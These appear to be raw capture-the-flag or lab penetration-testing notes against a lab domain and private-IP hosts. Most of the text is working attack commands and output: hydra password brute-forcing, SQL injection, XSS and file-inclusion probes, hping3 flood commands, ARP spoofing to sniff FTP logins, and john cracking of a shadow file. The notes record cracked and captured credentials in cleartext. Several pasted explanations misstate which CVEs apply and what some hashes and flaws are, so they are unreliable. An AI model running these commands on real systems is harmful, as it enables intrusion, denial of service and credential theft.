

found http://admin.yolo.co.il/index.html

hydra -l anonymous -P ~/Downloads/rockyou.txt ftp://192.168.2.8
hydra -l admin -P ~/Downloads/rockyou.txt ftp://192.168.2.8
must be port 113??

gobuster dir -u http://10.1.22.121 -w /path/to/wordlist.txt


nmap --script discovery 10.1.22.121
Path: http://10.1.22.121:80/static/css/main.eb4c4a7a.css

The **TRACE method** is enabled, which can lead to security issues. It should be disabled in the server configuration if not needed.

**Investigate Open Ports**: The open ports related to **Cisco SCCP**, **EtherNetIP**, and **SIP** services should be further investigated to ensure they are configured securely and not exposed unnecessarily.

**Further Enumeration**: 
dig yolo.co.il
dig @10.1.22.121 yolo.co.il
dnsenum --enum --dnsserver 10.1.22.121 --hostname yolo.co.il
admin.yolo.co.il.                        20       IN    A        10.1.22.121
ftp.yolo.co.il.                          20       IN    A        192.168.2.8
www.yolo.co.il.                          20       IN    CNAME    yolo.co.il.
yolo.co.il.                              20       IN    A        10.1.22.121
ping 192.168.2.8


nmap -p 21 192.168.2.8
**Filtered ports**: The `nmap` scan shows that port 21 is filtered. This means that there is some form of firewall or network filtering between your scanning machine and the target server that is blocking the connection.

The fact that `10.1.22.121` corresponds to both `yolo.co.il` and `admin.yolo.co.il` is important, especially when considering possible configuration overlaps between web and FTP services.

nikto -h 192.168.2.8
ftp 192.168.2.8
ftp 192.168.2.8:113
hydra -l admin -P /path/to/password_list.txt ftp://192.168.2.8
found http://admin.yolo.co.il/
Port 113 is typically associated with the **Ident protocol**, not FTP. The Ident protocol is used to map IP addresses to usernames and is commonly used to check the identity of a remote machine
lacks Deployment of the HSTS
************************************


ip: 10.1.22.121

Last-Modified: Thu, 08 Aug 2024 10:39:47 GMT

Date: Wed, 12 Mar 2025 12:59:29 GMT (2 hours prior current)

using: 
sudo ss -tulnp | grep :443
curl -v http://10.1.22.121
not configured for https 

running:
dirb http://10.1.22.121

***********************
http://10.1.22.121/index.html (CODE:200|SIZE:689)                            
+ http://10.1.22.121/robots.txt (CODE:200|SIZE:67)                             
==> DIRECTORY: http://10.1.22.121/static/                                      

---- Entering directory: http://10.1.22.121/static/ ----
==> DIRECTORY: http://10.1.22.121/static/css/                                  
==> DIRECTORY: http://10.1.22.121/static/js/                                   
==> DIRECTORY: http://10.1.22.121/static/media/                                
   
---- Entering directory: http://10.1.22.121/static/css/ ----
       
---- Entering directory: http://10.1.22.121/static/js/ ----
     
---- Entering directory: http://10.1.22.121/static/media/ ----
   
(!) FATAL: Too many errors connecting to host
    (Possible cause: OPERATION TIMEOUT)
**************************

entering"
http://10.1.22.121/robots.txt

getting:
# https://www.robotstxt.org/robotstxt.html
User-agent: *
Disallow:
- the /robots.txt file is a publicly available file. Anyone can see what sections of your server you don't want robots to use.
- 
try again using:
dirb http://10.1.22.121/static

running:
dnsenum 10.1.22.121

site settings:
allowed:
autoplay 
javascript
images
v8 optimizer
ask:
google sign-in
ethereum
solana 
automatic download
usb devices
serial ports
file editing 
HID devices
automatic picture-in-picture

running:
dig @10.1.22.121 ANY
;; Connection to 10.1.22.121#53(10.1.22.121) for . failed: connection refused.
;; no servers could be reached
* there could be a firewall or other issues blocking DNS queries.

dig @10.1.22.121 www.yolo.co.il
returns:
NOERROR
global options: +cmd

;; flags: qr aa rd ra;
qr: This indicates the query is a response (not a query).
aa: The DNS server is authoritative for the domain (meaning it provides the final answer).
rd: The recursive query flag is set (the DNS server is willing to perform recursion).
ra: The recursive query flag is set in the response (the server is capable of doing recursion).
;; QUESTION SECTION:
;www.yolo.co.il.			IN	A
This shows the DNS query that was made: www.yolo.co.il, asking for an A record (IPv4 address).
;; ANSWER SECTION:
www.yolo.co.il.		20	IN	CNAME	yolo.co.il.
yolo.co.il.		20	IN	A	10.1.22.121
The CNAME record for www.yolo.co.il is returned, pointing to yolo.co.il. This means www.yolo.co.il is an alias (canonical name) for yolo.co.il.
The A record for yolo.co.il resolves to the IP address 10.1.22.121.
uses (the standard DNS port)

running:
dig +short www.yolo.co.il
dig +short 10.1.22.121
dig +noall +answer 10.1.22.121

changing:
dig @10.1.22.121 10.1.22.121 A 
AUTHORITY SECTION:
.			10800	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2025031200 1800 900 604800 86400

dig @10.1.22.121 10.1.22.121 A +short
dig @10.1.22.121 10.1.22.121 A +noall +answer
dig @10.1.22.121 10.1.22.121 A +stats
dig @10.1.22.121 10.1.22.121 A +tcp
dig @10.1.22.121 10.1.22.121 A +cd
dig @10.1.22.121 10.1.22.121 A +nocmd
dig @10.1.22.121 10.1.22.121 A +trace
dig @10.1.22.121 10.1.22.121 A +dnssec
dig @10.1.22.121 10.1.22.121 A +time=3

**using vpn:**
dig @10.1.22.121 10.1.22.121 A

running nmap:
nmap -p- -sV -O 10.1.22.121
TCP/IP fingerprinting (for OS scan) requires root privileges.
QUITTING!

nmap -p- -sV 10.1.22.121
ORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.57 ((Unix))
2000/tcp open  tcpwrapped
2222/tcp open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
5060/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

**TRACE** is an HTTP method used for diagnostic purposes, where the server returns exactly what it received in the HTTP request

running:
nmap --script http-title,ssl-cert,smb-vuln-ms17-010

000/tcp open  cisco-sccp
2222/tcp open  EtherNetIP-1
5060/tcp open  sip

- **2000/tcp**: **Cisco SCCP** – Cisco's Skinny Client Control Protocol.
- - **5060/tcp**: **SIP** – Session Initiation Protocol, typically used for VoIP (Voice over IP) communication.

running:
ls /usr/share/nmap/scripts/ | sort
using all scripts available..

running:
sudo nmap --script acarsd-info.nse,address-info.nse,afp-brute.nse,afp-ls.nse,afp-path-vuln.nse,afp-serverinfo.nse,afp-showmount.nse,ajp-auth.nse,ajp-brute.nse,ajp-headers.nse,ajp-methods.nse,ajp-request.nse,allseeingeye-info.nse,amqp-info.nse,asn-query.nse,auth-owners.nse,auth-spoof.nse,backorifice-brute.nse,backorifice-info.nse,bacnet-info.nse,banner.nse,bitcoin-getaddr.nse,bitcoin-info.nse,bitcoinrpc-info.nse,bittorrent-discovery.nse,bjnp-discover.nse,broadcast-ataoe-discover.nse,broadcast-avahi-dos.nse,broadcast-bjnp-discover.nse,broadcast-db2-discover.nse,broadcast-dhcp6-discover.nse,broadcast-dhcp-discover.nse,broadcast-dns-service-discovery.nse,broadcast-dropbox-listener.nse,broadcast-eigrp-discovery.nse,broadcast-hid-discoveryd.nse,broadcast-igmp-discovery.nse,broadcast-jenkins-discover.nse,broadcast-listener.nse,broadcast-netbios-master-browser.nse,broadcast-networker-discover.nse,broadcast-novell-locate.nse,broadcast-ospf2-discover.nse,broadcast-pc-anywhere.nse,broadcast-pc-duo.nse,broadcast-pim-discovery.nse,broadcast-ping.nse,broadcast-pppoe-discover.nse,broadcast-rip-discover.nse,broadcast-ripng-discover.nse,broadcast-sonicwall-discover.nse,broadcast-sybase-asa-discover.nse,broadcast-tellstick-discover.nse,broadcast-upnp-info.nse,broadcast-versant-locate.nse,broadcast-wake-on-lan.nse,broadcast-wpad-discover.nse,broadcast-wsdd-discover.nse,broadcast-xdmcp-discover.nse,cassandra-brute.nse,cassandra-info.nse,cccam-version.nse,cics-enum.nse,cics-info.nse,cics-user-brute.nse,cics-user-enum.nse,citrix-brute-xml.nse,citrix-enum-apps.nse,citrix-enum-apps-xml.nse,citrix-enum-servers.nse,citrix-enum-servers-xml.nse,clamav-exec.nse,clock-skew.nse,coap-resources.nse,couchdb-databases.nse,couchdb-stats.nse,creds-summary.nse,cups-info.nse,cups-queue-info.nse,cvs-brute.nse,cvs-brute-repository.nse,daap-get-library.nse,daytime.nse,db2-das-info.nse,deluge-rpc-brute.nse,dhcp-discover.nse,dict-info.nse,distcc-cve2004-2687.nse,dns-blacklist.nse,dns-brute.nse,dns-cache-snoop.nse,dns-check-zone.nse,dns-client-subnet-scan.nse,dns-fuzz.nse,dns-ip6-arpa-scan.nse,dns-nsec3-enum.nse,dns-nsec3-enum.nse,dns-nsid.nse,dns-random-srcport.nse,dns-random-txid.nse,dns-recursion.nse,dns-service-discovery.nse,dns-srv-enum.nse,dns-update.nse,dns-zeustracker.nse,dns-zone-transfer.nse,docker-version.nse,domcon-brute.nse,domcon-cmd.nse,domino-enum-users.nse,dpap-brute.nse,drda-brute.nse,drda-info.nse,duplicates.nse,eap-info.nse,enip-info.nse,epmd-info.nse,eppc-enum-processes.nse,fcrdns.nse,finger.nse,fingerprint-strings.nse,firewalk.nse 10.1.22.121

running:
sudo nmap --script * 10.1.22.121 -oN full_nmap_scan.txt

then
nmap --script=$(ls /usr/share/nmap/scripts/ | tr '\n' ',') 10.1.22.121 -oN full_nmap_scan.txt

nmap --script vuln 10.1.22.121

nmap --script discovery 10.1.22.121
Path: http://10.1.22.121:80/static/css/main.eb4c4a7a.css

 Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34

- **Mozilla/5.0 (compatible; Nmap Scripting Engine; [https://nmap.org/book/nse.html](https://nmap.org/book/nse.html))**: This is the default user agent string used by the Nmap Scripting Engine (NSE) when it performs HTTP requests during a scan.
- **libwww**: A user agent for the `libwww` library, commonly used for HTTP requests in some software.
- **lwp-trivial**: This is a user agent for the Perl library `LWP` (Library for WWW in Perl), which is used for making HTTP requests.
- **libcurl-agent/1.0**: This user agent string is used by the `libcurl` library, which is widely used for making HTTP requests across different software.
- **PHP/**: Refers to PHP-based scripts or clients making HTTP requests.
- **Python-urllib/2.5**: The user agent for Python's `urllib` library, which is used to make HTTP requests.
- **GT::WWW**: A user agent for the `GT::WWW` Perl module, another HTTP request library.
- **Snoopy**: A PHP class for making HTTP requests, used for web scraping or accessing web pages programmatically.
- **MFC_Tear_Sample**: A specific user agent that seems to be associated with a sample from a malicious tool or attack software.
- **HTTP::Lite**: A simple HTTP client in Perl.
- **PHPCrawl**: A web crawling tool written in PHP.
- **URI::Fetch**: A Perl module used to fetch web pages.
- **Zend_Http_Client**: A PHP client used for HTTP requests in web applications.
- **http client**: A generic user agent for an HTTP client.
- **PECL::HTTP**: Refers to an HTTP client from the PECL (PHP Extension Community Library).
- **Wget/1.13.4 (linux-gnu)**: A well-known command-line tool for downloading files from the web.
- **WWW-Mechanize/1.34**: A Perl module that allows automating web browsing (e.g., filling forms, clicking buttons).

**127 names had status 200**: This means that 127 virtual host names (subdomains or websites hosted on this server) responded with an HTTP status code of 200 (OK). This indicates that these virtual hosts are correctly configured and available.
The web server is running Apache (version 2.4.57)

tried:
sudo hping3 --icmp --frag --data 65536 10.1.22.121

 ping -s 65500 10.1.22.121
 returns same amount in response

syn flood:
sudo hping3 -S -p 80 --flood 10.1.22.121
sudo hping3 --udp -p 80 --flood 10.1.22.121

nmap -sV -Pn --script=vuln 10.1.22.121



bruteforce attempt on ssh:
openssh on port 2222 
hydra -l root -P rockyou.txt -s 2222 10.1.22.121 ssh

service seems to go down when attempting bruteforce attack
may be possible using low and slow methodology 
around 250
comes back-up later 

perform arp spoofing:
sudo nmap -sn 10.1.22.121
sudo nmap -sn 10.1.22.0/24
sudo nmap -sP 10.1.22.0/24
sudo nmap -sn -sS -O 10.1.22.0/24
sudo nmap -O 10.1.22.0/24
sudo arp-scan 10.1.22.0/24

sudo netdiscover -r 10.1.22.0/24

create in python
inspect using wireshark

scanning:
nikto -h http://10.1.22.121 -Tuning 1,2,3,4,5,6,7,8
nikto -h http://10.1.22.121 -no404
nikto -h http://10.1.22.121 -Plugins ssl,headers
nikto -h http://10.1.22.121 -id "Mozilla/5.0"

http://10.1.22.121/?mod=node&nid=some_thing&op=view
retrieves code 200
checking different inputs:
/?mod=node&nid=1&op=view
/?mod=node&nid=1000&op=view
/?mod=node&nid=-1&op=view
/?mod=node&nid=999999&op=view
/?mod=node&nid=1' --&op=view
/?mod=node&nid=1 OR 1=1 --&op=view
/?mod=node&nid=1' AND 1=1 --&op=view
/?mod=node&nid=1' UNION SELECT NULL, username, password FROM users --&op=view
/?mod=node&nid=1&op=view HTTP/1.1
/?mod=node&nid=../../../../../etc/passwd&op=view
/?mod=node&nid=1&op=view
/?mod=node&nid=1&op=view&debug=true
/?mod=node&nid=1%0d%0aSet-Cookie: malicious=evil; op=view

xss:
/?mod=node&nid=<script>alert('XSS')</script>&op=view` – Test for reflected XSS on the `nid` parameter.
/?mod=node&nid=<img src="x" onerror="alert(1)">&op=view` – Test for XSS using the `img` tag with an error handler.
/?mod=node&nid=1"><script>alert(1)</script>&op=view` – Test for script injections in the HTML response.

Testing for Local File Inclusion:
- `/?mod=node&nid=../../../../etc/passwd&op=view` – Try including system files like `/etc/passwd` (on Unix systems) to check if they can be read by the server.
- `/?mod=node&nid=../../../../Windows/System32/drivers/etc/hosts&op=view` – Test for file inclusion on Windows systems by referencing the `hosts` file.
- `/?mod=node&nid=php://input&op=view` – Try to include PHP input streams to potentially gain access to data.

**Testing for Authorization Bypass**:
Some applications do not correctly enforce permissions on resources. Try changing the `mod` or `nid` parameters to see if you can access restricted resources.

- `/?mod=admin&nid=1&op=view` – Try to access an admin resource by changing `mod=node` to `mod=admin`.
- `/?mod=node&nid=1&op=delete` – Try modifying the `op` to `delete` to see if you can delete resources.
- `/?mod=user&nid=1&op=view` – Test if user-specific content can be accessed by changing `mod=node` to `mod=user`.

 **Testing for Cross-Site Request Forgery (CSRF)**:
CSRF attacks occur when an attacker tricks the user into making an unwanted request to a web application where they are authenticated.

- Submit the form using a tool like Burp Suite to intercept and modify the request to include a malicious request. This is done in a real-world scenario by changing the `nid` value or performing an operation like `op=delete` on behalf of the user.

conclusions:
nothing ever changes


nikto -h 10.1.22.121
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.1.22.121
+ Target Hostname:    10.1.22.121
+ Target Port:        80
+ Start Time:         2025-03-13 14:16:26 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.57 (Unix)
### 1. **CVE-2021-42013 - Path Traversal Vulnerability**
- **Description**: Apache HTTP Server 2.4.49 and 2.4.50 (released before 2.4.51) contain a path traversal vulnerability due to improper sanitization of URLs. This can allow an attacker to access sensitive files or directories on the server.
- **Fix**: Ensure Apache is updated to at least 2.4.51 to mitigate this vulnerability.
### 2. **CVE-2021-41773 - URL Encoding Vulnerability**
- **Description**: Apache HTTP Server 2.4.49 contains a vulnerability in how it handles URL encoding, leading to possible directory traversal attacks. An attacker can exploit this to access arbitrary files on the server.
- **Fix**: Update to Apache version 2.4.50 or later.
### 3. **CVE-2019-0211 - Privilege Escalation**
- **Description**: In Apache 2.4.x (especially 2.4.17-2.4.38), there is a flaw related to the way Apache handles child processes, which could allow an attacker to escalate privileges on the server.
- **Fix**: Update to the latest version of Apache HTTP Server (post 2.4.38).
### 4. **CVE-2020-11993 - Memory Corruption**
- **Description**: A memory corruption vulnerability was discovered in Apache HTTP Server 2.4.x, which could allow an attacker to execute arbitrary code via crafted requests. It can occur in mod_rewrite.
- **Fix**: Update to the latest Apache 2.4 version.
### 5. **CVE-2017-15710 - Range Header Handling Vulnerability**
- **Description**: Apache HTTP Server 2.4.17 through 2.4.29 contains a vulnerability in the way it processes HTTP Range headers. This can lead to a denial of service (DoS) if crafted requests are sent.
- **Fix**: Update to Apache 2.4.30 or later.
### 6. **CVE-2016-5387 - mod_auth_digest Denial of Service**
- **Description**: Apache HTTP Server versions 2.4.17 through 2.4.25 suffer from a DoS vulnerability in mod_auth_digest. Maliciously crafted Digest authentication headers could cause the server to crash.
- **Fix**: Update to Apache version 2.4.26 or later.
### 7. **CVE-2015-3183 - mod_php Cross-Site Scripting**
- **Description**: A cross-site scripting (XSS) vulnerability was found in mod_php for versions of Apache 2.4.x (before 2.4.16). An attacker could inject malicious JavaScript in response headers.
- **Fix**: Ensure your Apache version is updated to 2.4.16 or higher
### 8. **CVE-2014-0226 - mod_ssl Vulnerability**
- **Description**: This vulnerability allows attackers to bypass SSL/TLS encryption in Apache HTTP Server 2.4.x versions (before 2.4.7). It can expose encrypted traffic to attackers.
- **Fix**: Update to Apache 2.4.7 or later.

+ Server leaks inodes via ETags, header found with file /, fields: 0x2b1 0x61f29a542c2c0 
indicates a potential **ETag** header vulnerability in the Apache server

The **ETag** is an HTTP response header used for caching and optimizing web performance. It helps browsers determine if a resource has changed since the last request.
ETag: "0x2b1 0x61f29a542c2c0"
The values in the ETag header can **leak information** about the server's **file system**, such as:  
✅ **Inode numbers** (unique file identifiers on disk)  
**Inode Leaks → Fingerprinting Risk**

- Attackers can **infer the file structure** of the server.
- Helps in **directory traversal attacks** or **information disclosure exploits**.

✅ **Timestamps** (modification times)  
**User Tracking (Cross-Site Tracking)**

- Websites can **abuse ETags for tracking users**, bypassing cookie restrictions.
- Even with cookies disabled, ETags can help track unique visitors.

✅ **Hash values** (file integrity checks)
**Cache Inconsistencies & Exploitation**

- If **ETag values reveal timestamp changes**, attackers can **predict file modifications** and plan **cache poisoning attacks**.

+ The anti-clickjacking X-Frame-Options header is not present.
Clickjacking (UI redress attack) is an attack where a user is **tricked into clicking** on something different from what they perceive.
**Phishing attacks** – Trick users into entering credentials.  
✅ **Financial fraud** – Hijack banking transactions.

+ No CGI Directories found (use '-C all' to force check all possible dirs)
This message means that no **Common Gateway Interface (CGI) directories** were found on the scanned web server.
 CGI scripts (`.cgi`, `.pl`, `.py`, etc.) allow dynamic content execution on a web server.
**CGI scripts can be vulnerable** to exploits (e.g., Shellshock, command injection).  
✅ Attackers often scan for CGI directories to **exploit old or misconfigured scripts**.

+ "robots.txt" retrieved but it does not contain any 'disallow' entries 

+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET, TRACE 
The presence of the `TRACE` method in the **Allowed HTTP Methods** list is a potential security risk. This method can be exploited in **Cross-Site Tracing (XST) attacks**, where an attacker can abuse it to steal sensitive data, such as cookies with **HttpOnly** flags.
The TRACE method allows an attacker to see how a request is processed, potentially exposing internal details.

+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST

curl -X TRACE http://10.1.22.121 -b "CookieName=CookieValue; AnotherCookie=AnotherValue" -i

monitoring traffic using wireshark

exploring favicon.ico image request

gobuster dir -u http://10.1.22.121/ -w wordlist.txt
gobuster dir -u http://10.1.22.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

Inspecting developer tools:
HTTP headers responses and timing
**Key Security Headers**:

- **Strict-Transport-Security (HSTS)**: Enforces HTTPS and prevents downgrade attacks.
- **Content-Security-Policy (CSP)**: Controls what content can be loaded, protecting against XSS attacks.
- **X-Frame-Options**: Prevents the site from being embedded in iframes to mitigate clickjacking attacks.
- **X-XSS-Protection**: Activates browser-based protection against XSS attacks.
- **X-Content-Type-Options**: Prevents the browser from interpreting files as a different MIME type (protects against certain types of attacks).
- **Referrer-Policy**: Controls the amount of information sent with HTTP requests about the referring page.
- **Permissions-Policy**: Controls the permissions granted to the website (like camera, geolocation, etc.).

Cookies are stored by the browser for stateful communication with websites. They can contain sensitive information like authentication tokens and session identifiers.

The **Transport Layer Security (TLS)** or **Secure Sockets Layer (SSL)** protocol is essential for securing data during transmission. You can check if the website is using HTTPS (TLS) and if it has any issues like expired certificates.

Consule sec review:
`rgba(255, 255, 255, 1)` represents the color **white** in the RGBA (Red, Green, Blue, Alpha) format:

**Mixed Content Warnings**
Mixed content occurs when a website loaded over HTTPS requests resources (like scripts, images, or CSS files) over HTTP, which can introduce security vulnerabilities.

Developers tools state the input to registration requires 600 chars minVal
it uses react hook form to manage it
the lname and phone are not getting registered so they wont be validated or captured in the onSubmit function. It may be possible to add register to the inputs as well.

lighthouse checks:
If a page doesn't specify a `lang` attribute, a screen reader assumes that the page is in the default language that the user chose when setting up the screen reader. If the page isn't actually in the default language, then the screen reader might not announce the page's text correctly . [Learn more about the `lang` attribute](https://dequeuniversity.com/rules/axe/4.10/html-has-lang).

one large JS file found that also executes and slow and heavy
main thread spends long time on code eval

Avoids enormous network payloads - feature installed.
Avoids an excessive DOM size
Does not use HTTPS
Does not redirect HTTP traffic to HTTPS
Page lacks the HTML doctype, thus triggering quirks-mode

Browser errors were logged to the console:
Errors logged to the console indicate unresolved problems. They can come from network request failures and other browser concerns. [Learn more about this errors in console diagnostic audit](https://developer.chrome.com/docs/lighthouse/best-practices/errors-in-console/?utm_source=lighthouse&utm_medium=devtools)

Document does not have a meta description
Page has unsuccessful HTTP status code 404

Run the [Structured Data Testing Tool](https://search.google.com/structured-data/testing-tool/) and the [Structured Data Linter](http://linter.structured-data.org/) to validate structured data. [Learn more about Structured Data](https://developer.chrome.com/docs/lighthouse/seo/structured-data/?utm_source=lighthouse&utm_medium=devtools).

  
Page isn’t blocked from indexing

Search engines are unable to include your pages in search results if they don't have permission to crawl them. [Learn more about crawler directives](https://developer.chrome.com/docs/lighthouse/seo/is-crawlable/?utm_source=lighthouse&utm_medium=devtools).
  
Document has a `<title>` element

The title gives screen reader users an overview of the page, and search engine users rely on it heavily to determine if a page is relevant to their search. [Learn more about document titles](https://dequeuniversity.com/rules/axe/4.10/document-title).


Expected publicId to be an empty string
check ip in aircracker:
impossible

found backup in admin.yolo.co.il/backup/
curl -X PUT http://admin.yolo.co.il/upload_file
forbidden

shadow:
The passwords for most users are represented as `*` or `!`, which indicates that these accounts have **no password** or the account is **locked**.

dexter user:
**YubiKey-style bcrypt hash** password representation
hashcat -m 500 -a 0 shadow.txt /usr/share/wordlists/rockyou.txt
downloading and configuring john the ripper
from dir run
./john --wordlist=/usr/share/wordlists/rockyou.txt ~/shadow.txt
./john --show ~/shadow.txt
dexter:iloveyou1
ssh to server found flag1

dexter@35cc20b39538
The string `35cc20b39538` likely represents the hostname or identifier of the system or container you're logged into. It seems like a shortened version of a container's ID, which is often used by Docker or other containerized environments.
- It could also represent an auto-generated identifier for a system, container, or virtual machine.

running:
hostname
docker ps
cat /proc/cpuinfo

env:
the shell is bash
home directory 
**SSH_CONNECTION=10.10.2.46 49272 192.168.2.2 22**: This shows the IP address and port information of the SSH connection.
what is 192.168.2.2??
nmap -Pn 192.168.2.2
PORT    STATE  SERVICE
113/tcp closed ident
ping 192.168.2.2
traceroute 192.168.2.2

**PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games**: This is the system's executable search path.
says its game dir

cpu details:
**nx**: No-execute bit, which helps to prevent certain types of attacks by preventing code execution in certain areas of memory
**hypervisor**: Indicates that the processor is capable of virtualization, often a signal that you're in a virtual machine (VM).
**aes**: Indicates support for AES (Advanced Encryption Standard) instructions for faster encryption operations.
- - **smep, smap**: Security features to mitigate certain types of attacks.
### CPU Bugs:

- **bugs**: This shows vulnerabilities or known bugs related to the processor, such as:
    - **spectre_v1**, **spectre_v2**: These refer to the Spectre vulnerabilities, which affect many modern processors and allow for potential speculative execution attacks.
    - **fxsave_leak**: A known issue with saving the floating-point state.

- he processor model is an **AMD Ryzen 9 5950X**, which has 16 physical cores but the information shown here is for logical processors, as you're only seeing 1 core per listing (due to hyper-threading or similar).
- There are **8 processors** listed, each with a speed of 3.39 GHz, suggesting the CPU has 8 logical processors enabled.
- The presence of **hypervisor** in the flags implies that you're either running inside a virtual machine or on hardware with virtualization support enabled.


**SSH_TTY=/dev/pts/0**: This indicates you're connected through SSH using the `pts` (pseudoterminal slave).

ls -l /proc/1/exe
sudo ls -l /proc/1/exe

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo dmesg | grep -i virtual
dmesg: read kernel buffer failed: Operation not permitted

ls -a
.  ..  .dockerenv  bin	boot  dev  etc	home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

- **`.dockerenv`**: This file indicates that the system is running inside a Docker container.

ls proc/
ls etc/

The output from both `/proc/self/cgroup` and `/proc/1/cgroup` indicating `0::/` suggests that the system is not currently using cgroups in a way typical of containerized environments

ls dev/fd 
0 1 2 3

If running `cat /dev/xconsole` produces no output or results in an error, it likely means that the console device is not being used or not configured for output in your current environment.

**SSH into a container or VM**: It's possible that `ssh` connected you to a container or a virtual machine running on `10.1.22.121`, which has its own network interface (`eth0`) in a different network namespace (e.g., `192.168.2.2`).

**Network Namespace**: The `eth0@if12` interface indicates that you're working inside a specific network namespace (likely a container), which is why your IP address is `192.168.2.2` instead of one in the `10.1.22.x` range.

udp listener
127.0.0.11:51089

tcp 
127.0.0.11:39617
- **`0.0.0.0:80`**: This indicates a TCP service is **listening on all available network interfaces** (0.0.0.0) on port `80` (commonly used for HTTP). This means a web service is available on your machine.
- **`0.0.0.0:22`**: This shows that the SSH service is listening on all interfaces (`0.0.0.0`) on port `22`. This allows SSH access to your machine from any IP address.
- **`[::]:22`**: This indicates that SSH is also listening for IPv6 connections on port `22` (`[::]` represents the IPv6 equivalent of `0.0.0.0`).

tried ssh user@localhost
asked for password
dexters does not match

installed docker.io

ps aux | grep keyring

found host 192.168.1.100
scanned 
trying to connect to VoIp through open port
**Port 5060**: This is the default port for SIP (Session Initiation Protocol), a widely-used signaling protocol in VoIP systems.

uname -a
Linux 35cc20b39538 6.8.0-52-generic #53~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Wed Jan 15 19:18:46 UTC 2 x86_64 GNU/Linux

found         
/var/log/admin.yolo.co.il.log

found opening script
entrypoint.sh
This script is likely part of the initialization process for a web server container that also supports SSH and logging.

- **SSH Service**: Since the script starts the SSH service, you should be able to connect via SSH after the container has started, assuming the proper configurations and SSH keys are set up.
    
- **Check Apache**: Since it runs Apache HTTPD, you can check if the web server is functioning by looking for web content served by Apache.
apparmor module is loaded.
apparmor filesystem is not mounted.

dexter is the IT manager

mailname == 85c01788d70b
found exim mail service
some documentation about it in the /etc/ppp 

trying to ftp to 192.168.2.8
Name (192.168.2.8:dexter):
hydra -l mike -P /usr/share/wordlists/rockyou.txt admin.yolo.co.il http-get "/?username=^USER^&pswrd=^PASS^&remember=on" -s 80 -f -vV
hydra -l mike -P /usr/share/wordlists/rockyou.txt admin.yolo.co.il http-get "/?username=^USER^&pswrd=^PASS^&remember=on:F=incorrect" -s 80 -f -vV

hydra -l mike -P /usr/share/wordlists/rockyou.txt admin.yolo.co.il http-get "/?username=^USER^&pswrd=^PASS^&remember=on:F=incorrect" -s 80 -f -vV

trying connect via ppp

nc -v 192.168.2.3 10000

established a tunnel
ssh -L 10000:192.168.2.3:10000 dexter@192.168.2.2

ssh -L 10000:192.168.2.3:10000 -p 2222 dexter@10.1.22.121

and accessed webmin page
https://localhost:10000/

hydra -l dexter -P /usr/share/wordlists/rockyou.txt "https-post-form://localhost:10000/session_login.cgi:user=^USER^&pass=^PASS^:F=Login failed. Please try again."

Webmin Webserver on 1ad18a762c86

established tunnel
sudo tcpdump -i eth0 host 192.168.2.2 and host 192.168.2.3
tried to authenticate at webmin

trying to set arp spoofer between webmin and ftp

dexter@35cc20b39538:~$ sudo sys`sudo tail -f /var/log/vsftpd.log`ctl -a | grep ip_forward
sysctl: reading key "kernel.apparmor_display_secid_mode"
sysctl: reading key "kernel.apparmor_restrict_unprivileged_io_uring"
sysctl: reading key "kernel.apparmor_restrict_unprivileged_userns_complain"
sysctl: reading key "kernel.apparmor_restrict_unprivileged_userns_force"
sysctl: reading key "kernel.unprivileged_userns_apparmor_policy"
net.ipv4.ip_forward = 0
net.ipv4.ip_forward_update_priority = 1
net.ipv4.ip_forward_use_pmtu = 0

**Webmin** is a web-based system administration tool for UNIX-like systems (including Linux). It provides a graphical interface to manage various aspects of the system, including user management, disk management, service configuration, networking, and more.

### Authentication and Security in Webmin:

1. **Login**:
    
    - You first need to authenticate using the root or a privileged account.
    - Upon login, the Webmin server creates a session, which is stored on the client-side (cookie) for the user to interact with the interface.

sudo ls /var/webmin/
sudo ls /var/log/webmin/
sudo find /var/webmin/ -type f -name 'miniserv.session' 2>/dev/null
sudo grep -r 'webmin' / 2>/dev/null
sudo grep -r 'session' / 2>/dev/null
sudo grep -r 'cookie' / 2>/dev/null
sudo grep -r 'session' /var/log/webmin/


Check sessions cookies
sudo find / -type f -name '*session*' 2>/dev/null
sudo find / -type f -name '*cookie*' 2>/dev/null

!!!!!!!!!!!!!111

simulating ftp server to catch credentials from 192.168.3.1

35cc20b39538.42750 > ftp_server.dmz.ftp: Flags [S] seq
ftp_server.dmz.ftp > 35cc20b39538.42750: Flags [S.] seq
35cc20b39538.42750 > ftp_server.dmz.ftp: Flags [.], ack
ftp_server.dmz.ftp > 35cc20b39538.42750: Flags [P.], seq 1:29
35cc20b39538.42750 > ftp_server.dmz.ftp: Flags [.], ack 29,
...


sudo tcpdump -i eth0 host 192.168.3.1
sudo arpspoof -i eth0 -t 192.168.2.8 192.168.2.254
sudo arpspoof -i eth0 -t 192.168.2.254 192.168.2.8

implemented forwarder

USER
ftp_yolo
CyberSec@12

_______________________________________________________

flag 3

exploring ftp server options and meaning of clock file

ftp> status
Connected to 192.168.2.8.
No proxy connection.
Connecting using address family: any.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: on
Tick counter printing: off

not enough privileges to upload files 
pwd give "/"
account command


The `clock_update.sh` script contains the following command:
